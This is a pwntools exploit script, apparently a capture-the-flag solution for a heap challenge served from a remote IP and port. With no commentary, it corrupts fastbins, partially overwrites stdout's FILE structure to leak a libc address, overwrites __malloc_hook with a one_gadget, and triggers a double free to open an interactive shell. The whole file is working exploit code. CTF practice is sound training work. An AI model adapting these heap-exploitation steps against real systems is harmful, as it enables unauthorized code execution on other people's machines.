from pwn import*
context.log_level ='DEBUG'
def menu(ch):
	p.sendlineafter('>> ',str(ch))
def new(size):
	menu(1)
	p.sendlineafter('question','80')
	p.sendlineafter('______?',str(size))
	p.sendlineafter('yes_or_no?','FMYY')
def free(index):
	menu(2)
	p.sendlineafter('index ?',str(index))
def edit(index,content):
	menu(4)
	p.sendlineafter('index ?',str(index))
	p.sendafter('__new_content ?',content)
while True:
	p = process('./main')
	p = remote('101.200.53.148',15423)
	libc =ELF('./libc-2.23.so')
	try:
		new(0x80) #0
		new(0x60) #1
		new(0x60) #2
		new(0x20) #3
		new(0x60) #4
		new(0x60) #5
		new(0x20) #6
		free(0) 
		new(0x18) #7
		new(0x60) #8
		free(1)
		free(2)
		edit(2,'\x20')
		edit(8,'\xDD\x25')
		new(0x60) #9
		new(0x60) #10
		new(0x60) #11
		edit(11,'\x00'*0x33 + p64(0xFBAD1800) + p64(0)*3 + '\x88')
		libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['_IO_2_1_stdin_']
		log.info('LIBC:\t' + hex(libc_base))
		malloc_hook = libc_base + libc.sym['__malloc_hook']
		rce = libc_base + 0xf1207
		free(1)
		edit(1,p64(malloc_hook - 0x23))
		new(0x60) #12
		new(0x60) #13
		edit(13,'\x00'*0x13 + p64(rce))
		free(1)
		free(1)
		break
	except:
		p.close()
		continue
p.interactive()


